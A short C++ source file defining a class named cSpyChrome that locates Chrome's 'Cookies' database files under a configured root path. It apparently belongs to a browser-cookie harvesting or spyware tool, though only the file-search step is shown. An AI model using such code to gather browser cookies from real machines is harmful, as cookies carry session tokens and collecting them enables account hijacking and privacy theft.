#include "cSpyChrome.h"
#include "sConstants.h"
#include "sFileHelper.h"
cSpyChrome::cSpyChrome() 
	:IBrowser(sConstants::ROOT_PATH_COOKIES_CHROME)
{

}
void cSpyChrome::searchCookies(vector<string> &p_refvtstrCookiesPath)
{
	sFileHelper::getFiles(m_cstrCookiesPath, p_refvtstrCookiesPath, "Cookies");
}